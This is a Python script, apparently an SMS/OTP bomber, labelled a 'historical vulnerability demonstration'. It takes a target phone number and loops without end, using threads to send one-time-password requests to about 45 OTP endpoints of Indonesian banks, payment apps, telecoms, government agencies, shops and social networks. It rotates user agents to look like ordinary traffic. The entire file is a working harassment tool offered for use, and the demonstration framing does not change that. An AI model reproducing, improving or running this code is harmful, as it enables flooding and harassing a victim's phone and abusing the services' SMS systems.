#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Project: Eternal Veridian Hydra
# A self-perpetuating demonstration of historical verification system overload.

import requests
import time
import random
import sys
import argparse
from threading import Thread

# List of Indonesian service provider endpoints for verification
SERVICE_ENDPOINTS = [
    # E-commerce Platforms
    {"url": "https://account.shopee.co.id/api/v2/send_otp", "payload_key": "phone", "method": "POST"},
    {"url": "https://member.tokopedia.com/v1/send_otp", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.blibli.com/v3/otp/send", "payload_key": "phoneNumber", "method": "POST"},
    {"url": "https://api.bukalapak.com/v2/send_otp", "payload_key": "phone", "method": "POST"},
    {"url": "https://user.lazada.co.id/otp/send", "payload_key": "phone", "method": "POST"},
    
    # Fintech & Payment
    {"url": "https://api.ovo.id/v2.0/api/auth/customer/login2FA", "payload_key": "mobile", "method": "POST"},
    {"url": "https://api.gojekapi.com/v4/customers/send_otp", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.gopay.co.id/v2/customers/send_otp", "payload_key": "phone_number", "method": "POST"},
    {"url": "https://api.dana.id/api/v1/otp/send", "payload_key": "mobile", "method": "POST"},
    {"url": "https://api.linkaja.id/otp/send", "payload_key": "phone", "method": "POST"},
    
    # Ride Hailing
    {"url": "https://api.grab.com/grabid/v1/phone/otp", "payload_key": "phoneNumber", "method": "POST"},
    {"url": "https://api.gojekapi.com/v4/customers/register", "payload_key": "phone", "method": "POST"},
    
    # Banking & Financial
    {"url": "https://api.bca.co.id/otp/send", "payload_key": "phone_no", "method": "POST"},
    {"url": "https://api.mandiri.co.id/otp-service/v1/otp", "payload_key": "mobileNumber", "method": "POST"},
    {"url": "https://api.bni.co.id/otp/send", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.bri.co.id/otp/v1/send", "payload_key": "phone_number", "method": "POST"},
    {"url": "https://api.bsi.co.id/otp/send", "payload_key": "mobile", "method": "POST"},
    
    # Digital Services
    {"url": "https://api.telkomsel.com/v1/otp/send", "payload_key": "msisdn", "method": "POST"},
    {"url": "https://api.indosat.com/otp/v1/send", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.xl.co.id/otp/send", "payload_key": "msisdn", "method": "POST"},
    {"url": "https://api.three.co.id/otp/v1/send", "payload_key": "phone_number", "method": "POST"},
    {"url": "https://api.smartfren.com/otp/send", "payload_key": "msisdn", "method": "POST"},
    
    # Social Media & Entertainment
    {"url": "https://api.tiktok.com/passport/mobile/send_otp/", "payload_key": "mobile", "method": "POST"},
    {"url": "https://api.instagram.com/accounts/send_otp/", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.facebook.com/method/auth.sendOTP", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.twitter.com/1.1/onboarding/send_otp.json", "payload_key": "phone_number", "method": "POST"},
    
    # Travel & Hospitality
    {"url": "https://api.traveloka.com/v1/otp/send", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.tiket.com/otp/send", "payload_key": "phone_number", "method": "POST"},
    {"url": "https://api.pegipegi.com/otp/v1/send", "payload_key": "mobile", "method": "POST"},
    {"url": "https://api.airasia.com/otp/send", "payload_key": "phone", "method": "POST"},
    
    # Food Delivery
    {"url": "https://api.gofood.co.id/v1/otp/send", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.grab.com/grab-food/v1/otp", "payload_key": "phoneNumber", "method": "POST"},
    
    # Insurance
    {"url": "https://api.jago.com/otp/v1/send", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.allianz.co.id/otp/send", "payload_key": "mobile_number", "method": "POST"},
    {"url": "https://api.axa.co.id/otp/v1/send", "payload_key": "phone", "method": "POST"},
    
    # Government Services
    {"url": "https://api.bpjsketenagakerjaan.go.id/otp/send", "payload_key": "no_hp", "method": "POST"},
    {"url": "https://api.bpjs-kesehatan.go.id/v1/otp", "payload_key": "nomor_hp", "method": "POST"},
    {"url": "https://api.djp.go.id/otp/send", "payload_key": "telepon", "method": "POST"},
    
    # Education
    {"url": "https://api.ruangguru.com/v1/otp/send", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.zenius.net/otp/v1/send", "payload_key": "mobile", "method": "POST"},
    {"url": "https://api.quipper.com/otp/send", "payload_key": "phone_number", "method": "POST"},
    
    # Healthcare
    {"url": "https://api.halodoc.com/v1/otp/send", "payload_key": "phone", "method": "POST"},
    {"url": "https://api.alodokter.com/otp/v1/send", "payload_key": "mobile", "method": "POST"},
    {"url": "https://api.sehatq.com/otp/send", "payload_key": "phone_number", "method": "POST"}
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

def pulse_verification(endpoint_config, target_number):
    """A single head of the hydra strikes."""
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        payload = {endpoint_config['payload_key']: target_number}
        
        # Add additional required fields for specific APIs
        if 'shopee' in endpoint_config['url']:
            payload['country_code'] = '62'
            payload['phone'] = target_number.replace('+', '')
        elif 'tokopedia' in endpoint_config['url']:
            payload['type'] = 'register'
        elif 'gojek' in endpoint_config['url']:
            payload['country_code'] = 62
        elif 'grab' in endpoint_config['url']:
            payload['countryCode'] = 'ID'
        
        if endpoint_config['method'] == 'POST':
            response = requests.post(
                endpoint_config['url'],
                json=payload,
                headers=headers,
                timeout=8,
                verify=True
            )
        else:
            response = requests.get(
                endpoint_config['url'],
                params=payload,
                headers=headers,
                timeout=8,
                verify=True
            )
        
        if response.status_code in [200, 201, 202]:
            print(f"[✓] {endpoint_config['url']} - Status: {response.status_code}")
        elif response.status_code == 429:
            print(f"[!] {endpoint_config['url']} - Rate Limited (429)")
        elif response.status_code == 400:
            print(f"[!] {endpoint_config['url']} - Bad Request (400)")
        else:
            print(f"[!] {endpoint_config['url']} - Status: {response.status_code}")

    except requests.exceptions.Timeout:
        print(f"[!] {endpoint_config['url']} - Timeout")
    except requests.exceptions.ConnectionError:
        print(f"[!] {endpoint_config['url']} - Connection Failed")
    except requests.exceptions.RequestException as e:
        print(f"[!] {endpoint_config['url']} - Error: {str(e)[:50]}")
    except Exception as e:
        print(f"[!] {endpoint_config['url']} - Unexpected: {str(e)[:50]}")

def launch_hydra_cycle(target_number, cycle_delay=1.0, max_threads=10):
    """Launches one full cycle of services with thread limiting."""
    print(f"[+] Launching cycle for {target_number}...")
    threads = []
    
    for service in SERVICE_ENDPOINTS:
        # Limit concurrent threads
        while len([t for t in threads if t.is_alive()]) >= max_threads:
            time.sleep(0.1)
        
        try:
            t = Thread(target=pulse_verification, args=(service, target_number))
            threads.append(t)
            t.start()
            time.sleep(0.1)  # Stagger thread starts
        except Exception as e:
            print(f"[!] Thread failed: {str(e)[:30]}")

    # Wait for completion with timeout
    for t in threads:
        try:
            t.join(timeout=15)
        except:
            pass

    print(f"[+] Cycle complete. Resting for {cycle_delay}s...")
    time.sleep(cycle_delay)

def main():
    parser = argparse.ArgumentParser(description='Eternal Veridian Hydra - Indonesian Services Demo')
    parser.add_argument('number', help='Target phone number (e.g., +628123456789)')
    parser.add_argument('--delay', type=float, default=3.0, help='Delay between cycles in seconds (default: 3.0)')
    parser.add_argument('--threads', type=int, default=8, help='Max concurrent threads (default: 8)')
    
    args = parser.parse_args()
    target_number = args.number
    cycle_delay = args.delay
    max_threads = args.threads

    print("\n" + "="*65)
    print("    ETERNAL VERIDIAN HYDRA - INDONESIAN SERVICES")
    print("    Historical Vulnerability Demonstration")
    print("="*65)
    print(f"[+] Target: {target_number}")
    print(f"[+] Cycle Delay: {cycle_delay} seconds")
    print(f"[+] Max Threads: {max_threads}")
    print(f"[+] Services: {len(SERVICE_ENDPOINTS)} Indonesian platforms")
    print(f"[!] Press CTRL + C to terminate")
    print("="*65)

    # Validate Indonesian number format
    if not target_number.startswith('+62'):
        print(f"[!] Warning: Use Indonesian format (+628123456789)")

    cycle_count = 0
    try:
        while True:
            cycle_count += 1
            print(f"\n[--- Cycle #{cycle_count} ---]")
            launch_hydra_cycle(target_number, cycle_delay, max_threads)
            
    except KeyboardInterrupt:
        print(f"\n\n[!] Process interrupted by user")
        print(f"[!] Total cycles completed: {cycle_count}")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
